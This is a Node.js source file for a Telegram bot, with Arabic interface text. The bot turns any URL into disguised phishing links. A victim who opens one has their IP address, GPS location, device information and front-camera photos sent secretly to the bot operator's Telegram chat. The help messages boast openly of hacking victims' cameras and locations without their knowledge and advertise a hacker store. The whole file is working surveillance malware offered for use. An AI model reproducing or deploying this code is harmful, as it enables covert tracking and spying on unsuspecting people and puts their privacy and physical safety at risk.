const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL="your link⚠️⚠️⚠️";
//TOGGLE for Shorters
var use1pt=false;



app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
  
if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/th30neand0nly0ne");
}

         
                              
});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/th30neand0nly0ne");
}

         
                              
});



bot.on('message', async (msg) => {
const chatId = msg.chat.id;

 

if(msg?.reply_to_message?.text=="🌐 ارسل رابط كي يتم تلغيمه"){
 createLink(chatId,msg.text); 
}
  
if(msg.text=="/start"){
var m={
reply_markup:JSON.stringify({"inline_keyboard":[[{text:"اضغط لصنع رابط ملغم",callback_data:"crenew"}],[{text:"للتواصل معا المطور ميزو😈",url:"http://t.me/m_07_d"}],[{text:"بوت متجر الهكر🤖",url:"http://t.me/zzmarkets_bot"}]]})
};

bot.sendMessage(chatId, `مرحبا ${msg.chat.first_name} ! , \nفي بوت حاكم الدمار إختراق الكاميرا الاماميه والموقع🕸😈.\nوبعض المعلومات الحاسسه في جهاز  الضحية🥷🏾✅\n\nارسل. /help لمعرفه طريقه استخدام البوت. .`,m);
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,` هلا بك في بوت حاكم الدمار 😈 إختراق الكاميرا الاماميه وموقع الضحيه وبعض المعلومات الحاسسه في جهاز  الضحية برابط فقط👨‍💻⚠️.\n\nارسل. /create \nالبوت سوف ينشاء لك اثنين روابط ملغمه من الرابط الذي ارسلته يمكنك ارسال احد الروابط للضحيه
\n\nطبعا تقوم برسال للبوت اي رابط وسوف يقوم البوت في تلغيم الربط. ⚠️ملاحظة سوف يتم اظهار صفحة اعلانيه عندما يدخل الضحيه الرابط ومن ثم يتم توجهة الي الرابط الذي قمت بكتابته الي الرابط الحقيقي دون اي يعرف الضحية انه مخترق⚠️.
\n .🛡كل شي تتعلمه مجانا داخل بوت المتجر @zzmarkets_bot  \n\n1. . قناتي الرسميه لتحديثات والجميع مطلبات الهاكر
@SJGDDw
\n2. . ⚠️ملاحظة من المستحيل للمطور او اي مستخدم في البوت معرفة اي رسالة لك في البوت الخاص بك🚷  بمكانك تلغيم اي رابط لفيديو او موقع فيس او انستا او اي شي مثال https://google.com 
\n\nلطلب نسخة من البوت بكامل حقوقك التواصل مع ميزو😈  @m_07_d 
"إن الله بما تعملون بصير
`);
}
  
  
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
} 
});
bot.on('polling_error', (error) => {
//console.log(error.code); 
});






async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
 
var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"اضغط لصنع رابط جديد",callback_data:"crenew"}],[{text:"للتواصل معا المطور ميزو☠",url:"http://t.me/m_07_d"}],[{text:"بوت متجر الهكر🤖",url:"http://t.me/zzmarkets_bot"}]]
  } )
};

var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;
  
bot.sendChatAction(cid,"typing");
if(use1pt){
var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

var f="",g="";

for(var c in x){
f+=x[c]+"\n";
}

for(var c in y){
g+=y[c]+"\n";
}
  
bot.sendMessage(cid, `تم صنع رابط ملغم بنجاح🕸😈\nURL: ${msg}\n\n✅رابط الملغم  هذا\n\n🌐 الرابط الملغم الاول💯\n${f}\n\n🌐 الرابط الملغم الثاني 🕸\n${g}`,m);
}
else{

bot.sendMessage(cid, `تم صنع روابط ملغمه بنجاح\nURL: ${msg}\n\n✅الروابط الملغمه\n\n🌐 الرابط الملغم الاول\n${cUrl}\n\n🌐 الرابط الملغم الثاني \n${wUrl}`,m);
}
}
else{
bot.sendMessage(cid,`⚠️ يرجى ارسال رابط صحيح , يجب ان يبدا الرابط بي  http or https.`);
createNew(cid);

}  
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 ارسل رابط كي يتم تلغيمه`,mk);
}





app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});

  
});


app.post("/location",(req,res)=>{

  
var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
  
res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null; 
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});

  
res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;
  
if( uid != null && img != null){
  
var buffer=Buffer.from(img,'base64');
  
var info={
filename:"camsnap.png",
contentType: 'image/png'
};


try {
bot.sendPhoto(parseInt(uid,36),buffer,{},info);
} catch (error) {
console.log(error);
}


res.send("Done");
 
}

});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
